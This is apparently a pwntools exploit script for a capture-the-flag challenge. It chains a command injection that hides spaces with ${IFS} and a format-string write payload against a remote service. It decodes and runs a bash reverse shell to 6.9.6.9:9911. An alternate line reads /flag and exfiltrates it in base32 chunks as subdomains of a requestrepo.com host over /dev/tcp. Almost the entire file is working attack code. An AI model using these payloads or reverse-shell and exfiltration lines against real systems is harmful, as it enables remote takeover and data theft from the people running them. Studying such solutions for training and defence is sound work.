import sys, base64
from pwn import *

r = remote(sys.argv[1], sys.argv[2]) if len(sys.argv) > 2 else process("./chal")

REV = r"""data=$(cat /flag | base32 -w 0); while [ -n "$data" ]; do chunk=${data:0:50}; data=${data:50}; bash -c "bash -i >& /dev/tcp/$chunk.lp2drty9.requestrepo.com/9911 0>&1"; done""" # if you don't have a VPS
REV = "bash -c 'bash -i >& /dev/tcp/6.9.6.9/9911 0>&1'"
payload = f"';echo${{IFS}}{base64.b64encode(REV.encode()).decode()}|base64${{IFS}}-d|bash;"
payload += 119 * "%c" + f"%{9259 - len(payload)}c"
payload += (
    17 * "%c"
    + "%3982c"
    + 10 * "%c"
    + "%hn"
    + 4 * "%c"
    + "%57227c"
    + 2 * "%c"
    + "%hn"
    + 17 * "%243360c"
    + "%31c%n"
    + 5 * "%c"
    + "%21155c%hn'"
)
print(payload)

age = 1

while True:
    age += 1
    res = r.recvuntil(b"> ")
    print(res)
    r.sendline(b"1")
    r.recvuntil(b"username: ")
    r.sendline(payload.encode())
    r.recvuntil(b"age: ")
    r.sendline(str(age).encode())
